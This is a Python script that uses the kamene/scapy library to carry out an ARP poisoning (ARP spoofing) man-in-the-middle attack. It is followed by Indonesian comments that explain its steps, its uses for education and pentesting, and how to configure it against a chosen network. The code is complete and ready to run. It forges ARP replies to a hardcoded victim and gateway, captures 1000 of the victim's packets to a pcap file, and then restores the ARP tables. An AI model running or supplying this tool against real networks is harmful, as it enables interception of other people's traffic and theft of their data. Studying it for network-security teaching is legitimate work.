from kamene.all import *
import sys
import threading
import time
# 
interface = "en1"
tgt_ip = " 172.16.1.71"
tgt_gateway = " 172.16.1.254"
packet_count = 1000
poisoning = True


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # slightly different method using send
    print("[*] Restoring target...")
    send(ARP(op=2,
             psrc=gateway_ip,
             pdst=target_ip,
             hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gateway_mac),
         count=5)
    send(ARP(op=2,
             psrc=target_ip,
             pdst=gateway_ip,
             hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=target_mac),
         count=5)


def get_mac(ip_address):
    responses, unanswered = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
        timeout=2,
        retry=10
    )

    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src
    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning

    poison_tgt = ARP()
    poison_tgt.op = 2
    poison_tgt.psrc = gateway_ip
    poison_tgt.pdst = target_ip
    poison_tgt.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while poisoning:
        send(poison_tgt)
        send(poison_gateway)
        time.sleep(2)

    print("[*] ARP poison attack finished.")

    return


# set our interface
conf.iface = interface

# turn off output
conf.verb = 0

print("[*] Setting up %s" % interface)

tgt_gateway_mac = get_mac(tgt_gateway)

if tgt_gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway %s is at %s" % (tgt_gateway, tgt_gateway_mac))

tgt_mac = get_mac(tgt_ip)

if tgt_mac is None:
    print("[!!!] Failed to get target MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Target %s is at %s" % (tgt_ip, tgt_mac))

# start poison thread
poison_thread = threading.Thread(target=poison_target,
                                 args=(tgt_gateway,
                                       tgt_gateway_mac,
                                       tgt_ip,
                                       tgt_mac)
                                 )
poison_thread.start()

try:
    print("[*] Starting sniffer for %d packets" % packet_count)
    bpf_filter = "ip host %s" % tgt_ip
    packets = sniff(count=packet_count,
                    filter=bpf_filter,
                    iface=interface
                    )
    # write out the captured packets
    print("[*] Writing packets to arper.pcap")
    wrpcap('arper.pcap', packets)

except KeyboardInterrupt:
    pass

finally:
    poisoning = False
    # wait for poisoning thread to exit
    time.sleep(2)

    # restore the network
    restore_target(tgt_gateway,
                   tgt_gateway_mac,
                   tgt_ip,
                   tgt_mac
                   )
    sys.exit(0)


# =============================================================== # 
    
# Program ini merupakan implementasi sederhana dari serangan ARP Poisoning (atau sering disebut sebagai ARP Spoofing). Berikut adalah alur kerjanya:

# Inisialisasi Variabel: Program mulai dengan mendefinisikan variabel-variabel seperti interface (interface jaringan yang akan digunakan), tgt_ip (alamat IP target yang akan diserang), tgt_gateway (alamat IP gateway), packet_count (jumlah paket yang akan ditangkap), dan poisoning (status serangan ARP poisoning).

# Fungsi untuk Memulihkan Target: Fungsi restore_target digunakan untuk memulihkan target setelah serangan ARP poisoning selesai. Fungsi ini mengirimkan paket ARP kepada target dan gateway untuk mengembalikan tabel ARP mereka ke keadaan semula.

# Fungsi untuk Mendapatkan MAC Address: Fungsi get_mac digunakan untuk mendapatkan alamat MAC dari sebuah alamat IP. Fungsi ini menggunakan paket ARP untuk mengirimkan permintaan ARP dan mendapatkan responnya.

# Fungsi untuk Melakukan ARP Poisoning: Fungsi poison_target adalah inti dari serangan ARP poisoning. Fungsi ini mengirimkan paket-paket ARP palsu secara periodik kepada target dan gateway untuk memalsukan tabel ARP mereka.

# Konfigurasi Interface dan Verbosity: Konfigurasi untuk menggunakan interface yang telah ditentukan, dan menonaktifkan output verbosity.

# Mendapatkan MAC Address dari Gateway dan Target: Program mencoba mendapatkan alamat MAC dari gateway dan target menggunakan fungsi get_mac.

# Memulai Thread Poisoning: Program memulai thread yang akan menjalankan fungsi poison_target untuk melakukan serangan ARP poisoning secara kontinu.

# Memulai Sniffer: Program mulai menjalankan sniffer untuk menangkap paket-paket yang ditujukan kepada target. Sniffer diatur dengan filter BPF untuk hanya menangkap paket yang ditujukan kepada target.

# Menyimpan Paket yang Ditangkap: Paket-paket yang ditangkap oleh sniffer disimpan dalam file .pcap menggunakan fungsi wrpcap.

# Penanganan KeyboardInterrupt: Program menangani penekanan tombol keyboard (Ctrl+C) untuk menghentikan sniffer dan memulihkan keadaan jaringan.

# Mengakhiri Program: Program menutup serangan ARP poisoning dengan mengubah status variabel poisoning menjadi False, menunggu thread poisoning selesai, memulihkan keadaan jaringan, dan kemudian keluar dari program.

# Program ini digunakan untuk mendemonstrasikan serangan ARP poisoning dan menunjukkan bagaimana cara menangkap paket yang ditujukan kepada target selama serangan tersebut berlangsung.

# ==================================================================================================================================================================================================================================== # 

# Manfaat:

# Pemahaman tentang ARP Poisoning: Program ini membantu pengguna memahami serangan ARP Poisoning dengan memberikan sebuah implementasi sederhana dari serangan tersebut. Dengan menjalankan program ini, pengguna dapat melihat secara langsung bagaimana serangan ini dapat dilakukan dan efeknya terhadap jaringan.

# Pengujian Keamanan Jaringan: Program ini dapat digunakan oleh para profesional keamanan jaringan untuk menguji keamanan jaringan mereka sendiri. Dengan mengetahui cara serangan ARP Poisoning dilakukan, pengguna dapat mengidentifikasi kerentanan dalam jaringan mereka dan mengambil langkah-langkah untuk memperkuat keamanannya.

# Pendidikan dan Pelatihan: Program ini dapat digunakan sebagai alat pendidikan dan pelatihan untuk mengajarkan konsep-konsep dasar keamanan jaringan kepada mahasiswa atau para profesional IT. Dengan memberikan sebuah contoh implementasi dari serangan ARP Poisoning, program ini dapat membantu memperdalam pemahaman mereka tentang topik tersebut.

# Cara Penggunaan:

# Menentukan Variabel: Pengguna harus menentukan variabel-variabel seperti interface, tgt_ip, dan tgt_gateway sesuai dengan konfigurasi jaringan yang ingin diserang. Ini dilakukan di bagian awal program.

# Menjalankan Program: Pengguna menjalankan program ini di lingkungan Python. Program akan mulai mengeksekusi langkah-langkah yang didefinisikan di dalamnya.

# Melihat Output: Selama program berjalan, pengguna akan melihat output yang menunjukkan proses serangan ARP Poisoning, tangkapan paket, serta pesan yang menandakan status proses.

# Pengembangan:

# Peningkatan Fungsionalitas: Program ini dapat ditingkatkan dengan menambahkan fitur-fitur tambahan seperti penyerangan target lainnya, mendeteksi serangan ARP Poisoning, atau melacak penggunaan bandwidth yang mencurigakan.

# Optimasi dan Pemeliharaan: Pengembang dapat melakukan optimasi pada kode program untuk meningkatkan kinerja dan efisiensi. Selain itu, pemeliharaan rutin juga diperlukan untuk memperbaiki bug dan menjaga kompatibilitas dengan lingkungan yang berubah.

# Penyempurnaan Keamanan: Program ini juga dapat diperbaiki untuk memperkuat keamanan, misalnya dengan menerapkan mekanisme otentikasi yang lebih kuat, atau dengan menghindari penggunaan fungsi-fungsi yang rentan terhadap serangan.

# Dokumentasi dan Edukasi: Pengembang dapat menambahkan dokumentasi yang lebih lengkap serta materi edukatif tentang serangan ARP Poisoning, baik dalam bentuk komentar di dalam kode maupun dalam dokumentasi terpisah. Hal ini akan membantu pengguna dalam memahami lebih dalam tentang topik tersebut.

# ===================================================================================================================================================================================================================================================================================================================================== # 
    


